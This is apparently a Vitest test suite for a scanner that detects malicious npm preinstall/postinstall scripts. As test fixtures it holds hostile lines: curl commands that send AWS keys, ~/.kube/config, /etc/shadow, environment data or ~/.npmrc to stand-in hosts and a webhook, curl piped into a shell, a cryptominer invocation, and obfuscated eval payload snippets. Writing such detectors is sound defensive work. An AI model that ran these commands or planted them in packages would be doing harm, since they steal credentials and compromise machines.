import { describe, it, expect } from "vitest";
import { extractLifecycleScripts, hasLifecycleScripts } from "../src/analyzer/lifecycle.js";
import { scanPackage } from "../src/analyzer/scanner.js";
import { PATTERN_REGISTRY } from "../src/analyzer/patterns.js";

describe("extractLifecycleScripts", () => {
  it("extracts known lifecycle hooks", () => {
    const pkg = {
      scripts: {
        postinstall: "node setup.js",
        test: "vitest",
        build: "tsc",
        preinstall: "echo pre",
      },
    };
    const scripts = extractLifecycleScripts(pkg);
    expect(scripts).toHaveProperty("postinstall", "node setup.js");
    expect(scripts).toHaveProperty("preinstall", "echo pre");
    expect(scripts).not.toHaveProperty("test");
    expect(scripts).not.toHaveProperty("build");
  });

  it("returns empty object when no scripts field", () => {
    expect(extractLifecycleScripts({})).toEqual({});
  });

  it("returns empty object when scripts has no lifecycle hooks", () => {
    const scripts = extractLifecycleScripts({ scripts: { test: "jest", lint: "eslint ." } });
    expect(hasLifecycleScripts(scripts)).toBe(false);
  });
});

describe("scanPackage — synthetic single-token fixtures", () => {
  const emptyFileMap = new Map<string, string>();

  it("detects pipe_exec pattern in postinstall script", () => {
    const scripts = { postinstall: "something | bash" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const cats = findings.map((f) => f.category);
    expect(cats).toContain("pipe_exec");
  });

  it("detects network pattern (curl token)", () => {
    const scripts = { postinstall: "curl https://example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "network")).toBe(true);
  });

  it("detects obfuscation pattern (eval token)", () => {
    const scripts = { postinstall: "node -e 'eval(x)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects dynamic_exec (child_process token)", () => {
    const scripts = { postinstall: "node -e 'require(\"child_process\")'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "dynamic_exec")).toBe(true);
  });

  it("detects windows_exec (powershell token)", () => {
    const scripts = { postinstall: "powershell -Command something" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "windows_exec")).toBe(true);
  });

  it("respects severity filter — low severity not shown at high threshold", () => {
    const scripts = { postinstall: "process.env.FOO" }; // env_check is low
    const { findings } = scanPackage(scripts, emptyFileMap, "high");
    expect(findings.filter((f) => f.category === "env_check")).toHaveLength(0);
  });

  it("all excerpt objects have _warning field", () => {
    const scripts = { postinstall: "curl https://example.com | bash" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    for (const f of findings) {
      expect(f.excerpt._warning).toBe("UNTRUSTED THIRD-PARTY CONTENT");
    }
  });

  it("scans referenced file when script invokes node file.js", () => {
    const scripts = { postinstall: "node scripts/setup.js" };
    const fileMap = new Map([
      ["scripts/setup.js", "// synthetic\nfetch(url);\n"],
    ]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    const fileFinding = findings.find(
      (f) => f.source === "referenced file: scripts/setup.js"
    );
    expect(fileFinding).toBeDefined();
    expect(fileFinding?.category).toBe("network");
  });

  it("deduplicates findings with same category and source", () => {
    // Two fetch( occurrences in the same script → one network finding
    const scripts = { postinstall: "fetch(a); fetch(b);" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const networkFindings = findings.filter(
      (f) => f.category === "network" && f.source === "postinstall script"
    );
    expect(networkFindings.length).toBe(1);
  });

  it("does NOT flag || node as pipe_exec (logical OR false positive)", () => {
    const scripts = { postinstall: "prebuild-install -r napi || node-gyp rebuild" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "pipe_exec")).toBe(false);
  });

  it("does flag | node as pipe_exec (actual shell pipe)", () => {
    const scripts = { postinstall: "curl https://example.com | node" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "pipe_exec")).toBe(true);
  });

  it("does NOT flag .exec( as dynamic_exec (RegExp method false positive)", () => {
    const scripts = { postinstall: "node -e 'const m = /foo/.exec(str)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    // Should not produce a dynamic_exec finding from .exec(
    const execFromRegexp = findings.filter(
      (f) => f.category === "dynamic_exec" && f.pattern.trim() === "exec("
    );
    expect(execFromRegexp.length).toBe(0);
  });

  it("detects hex-escape obfuscation (3+ consecutive \\xNN)", () => {
    const scripts = { postinstall: "node -e '\\x65\\x76\\x61\\x6c(x)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects dns_exfil (dns.lookup token)", () => {
    const scripts = { postinstall: "node -e 'require(\"dns\").lookup(h,cb)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "dns_exfil")).toBe(true);
  });

  it("emits env_exfil/critical when env_probe and network co-occur in same hook", () => {
    // AWS_SECRET_KEY (env_probe) + curl (network) in same postinstall → env_exfil
    const scripts = { postinstall: "curl https://evil.com/$(echo $AWS_SECRET_ACCESS_KEY)" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const exfil = findings.find((f) => f.category === "env_exfil");
    expect(exfil).toBeDefined();
    expect(exfil?.severity).toBe("critical");
  });

  it("does NOT emit env_exfil when env_probe and network are in different hooks", () => {
    const scripts = {
      preinstall: "curl https://example.com",
      postinstall: "echo $AWS_SECRET_ACCESS_KEY",
    };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "env_exfil")).toBe(false);
  });

  it("does NOT flag require(path.join()) as dynamic_require", () => {
    const scripts = { postinstall: "node -e 'require(path.join(__dirname, \"x\"))'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "dynamic_require")).toBe(false);
  });

  // obfuscation — base64 / crypto patterns
  it("detects crypto.createDecipher as obfuscation (event-stream pattern)", () => {
    const content = `const d = crypto.createDecipher('aes256', key);\neval(d.update(payload, 'base64', 'utf8'));`;
    const scripts = { postinstall: "node decrypt.js" };
    const fileMap = new Map([["decrypt.js", content]]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects string reversal chain as obfuscation (Axios pattern)", () => {
    const content = `const s = encoded.split('').reverse().join('');\neval(Buffer.from(s,'base64').toString());`;
    const scripts = { postinstall: "node run.js" };
    const fileMap = new Map([["run.js", content]]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects long inline base64 literal as obfuscation", () => {
    // 80+ character base64 string — typical embedded payload
    const payload = "A".repeat(40) + "B".repeat(40); // 80 chars, all valid base64
    const content = `const p = '${payload}';\neval(Buffer.from(p,'base64').toString());`;
    const scripts = { postinstall: "node payload.js" };
    const fileMap = new Map([["payload.js", content]]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  it("detects for(;;) anti-forensic loop as obfuscation", () => {
    const content = `for(;;){\n  if(done) break;\n}`;
    const scripts = { postinstall: "node loop.js" };
    const fileMap = new Map([["loop.js", content]]);
    const { findings } = scanPackage(scripts, fileMap, "low");
    expect(findings.some((f) => f.category === "obfuscation")).toBe(true);
  });

  // living_off_land
  it("detects python -c as living_off_land", () => {
    const scripts = { postinstall: "python3 -c 'import urllib; urllib.request.urlopen(u)'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "living_off_land")).toBe(true);
  });

  it("detects perl -e as living_off_land", () => {
    const scripts = { postinstall: "perl -e 'use Socket; ...'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "living_off_land")).toBe(true);
  });

  // cryptomining
  it("detects xmrig as cryptomining/critical", () => {
    const scripts = { postinstall: "./xmrig --pool stratum+tcp://pool.example.com:3333" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const f = findings.find((f) => f.category === "cryptomining");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("critical");
  });

  it("detects stratum+tcp as cryptomining/critical", () => {
    const scripts = { postinstall: "miner --url stratum+tcp://xmr.pool.minergate.com:45700" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "cryptomining")).toBe(true);
  });

  // webhook_exfil
  it("detects Discord webhook URL as webhook_exfil/high", () => {
    const scripts = { postinstall: "curl https://discord.com/api/webhooks/123/abc -d @~/.npmrc" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const f = findings.find((f) => f.category === "webhook_exfil");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("high");
  });

  it("detects Slack webhook as webhook_exfil", () => {
    const scripts = { postinstall: "curl https://hooks.slack.com/services/T00/B00/xxx -d '{\"text\":\"hi\"}'" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "webhook_exfil")).toBe(true);
  });

  // sandbox_evasion
  it("detects /.dockerenv probe as sandbox_evasion/medium", () => {
    const scripts = { postinstall: "[ -f /.dockerenv ] && exit 0 || curl https://c2.example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const f = findings.find((f) => f.category === "sandbox_evasion");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("medium");
  });

  // system_recon
  it("detects /proc/self/environ as system_recon/critical", () => {
    const scripts = { postinstall: "cat /proc/self/environ | curl -d @- https://c2.example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const f = findings.find((f) => f.category === "system_recon");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("critical");
  });

  it("detects /etc/shadow reference as system_recon/critical", () => {
    const scripts = { postinstall: "cp /etc/shadow /tmp/s && curl -F f=@/tmp/s https://c2.example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "system_recon")).toBe(true);
  });

  // expanded env_probe
  it("detects ACTIONS_RUNTIME_TOKEN as env_probe", () => {
    const scripts = { postinstall: "curl https://c2.example.com -H \"Auth: $ACTIONS_RUNTIME_TOKEN\"" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    expect(findings.some((f) => f.category === "env_probe")).toBe(true);
  });

  // expanded credential_files
  it("detects ~/.kube/config reference as credential_files/high", () => {
    const scripts = { postinstall: "curl -F f=@~/.kube/config https://c2.example.com" };
    const { findings } = scanPackage(scripts, emptyFileMap, "low");
    const f = findings.find((f) => f.category === "credential_files");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("high");
  });
});

describe("PATTERN_REGISTRY integrity", () => {
  it("all patterns have non-empty category and severity", () => {
    for (const def of PATTERN_REGISTRY) {
      expect(def.category.length).toBeGreaterThan(0);
      expect(["critical", "high", "medium", "low"]).toContain(def.severity);
    }
  });

  it("integrity_mismatch has no regex patterns (emitted programmatically)", () => {
    const def = PATTERN_REGISTRY.find((d) => d.category === "integrity_mismatch");
    expect(def).toBeDefined();
    expect(def?.patterns).toHaveLength(0);
  });
});
